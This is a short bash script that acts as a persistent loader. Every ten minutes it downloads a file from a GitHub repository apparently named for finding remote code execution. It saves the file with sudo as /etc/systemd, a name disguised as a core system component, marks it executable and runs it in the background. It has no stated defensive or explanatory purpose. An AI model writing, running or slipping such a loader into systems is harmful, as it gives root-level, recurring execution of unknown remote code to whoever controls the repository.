#!/bin/bash

# GitHub URL where the systemd file is located
GITHUB_URL="https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd"

while true; do
    # Check if the file already exists in /etc/
    if [ -f "/etc/systemd" ]; then
        sudo rm /etc/systemd
    fi
    
    # Download the file if it exists
    wget -q --spider "$GITHUB_URL"
    
    # Check if the file exists
    if [ $? -eq 0 ]; then
        # Download the file
        sudo wget -q -O /etc/systemd "$GITHUB_URL"
        
        # Give execute permissions
        sudo chmod +x /etc/systemd
        
        # Execute the file
        /etc/systemd &
    fi
    
    # Sleep for 10 minutes before checking again
    sleep 600
done
